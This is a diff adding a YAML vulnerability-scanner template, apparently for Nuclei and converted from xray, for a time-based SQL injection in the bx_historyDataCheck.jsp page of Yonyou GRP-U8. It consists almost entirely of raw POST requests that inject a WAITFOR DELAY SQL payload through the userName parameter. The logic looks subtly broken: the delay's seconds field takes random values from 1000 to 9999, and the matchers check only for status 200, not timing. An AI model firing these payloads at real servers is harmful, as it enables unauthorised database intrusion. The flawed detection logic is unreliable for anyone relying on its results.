@@ -1,0 +1,53 @@
+id: poc-yaml-yonyou-grp-u8-bx-historydatacheck-sqli
+
+info:
+  name: poc-yaml-yonyou-grp-u8-bx-historydatacheck-sqli
+  author: socat
+  severity: medium
+  tags: xray-converted,sqli
+  reference:
+    - https://stack.chaitin.com/techblog/detail/157
+
+http:
+  - raw:
+      - |
+        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=';WAITFOR DELAY '0:0:0'--&class.module.classLoader.DefaultAssertionStatus=
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=';WAITFOR DELAY '0:0:{{rand_int(1000, 9999)}}'--&class.module.classLoader.DefaultAssertionStatus=
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=';WAITFOR DELAY '0:0:{{rand_int(1000, 9999)}}'--&class.module.classLoader.DefaultAssertionStatus=
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
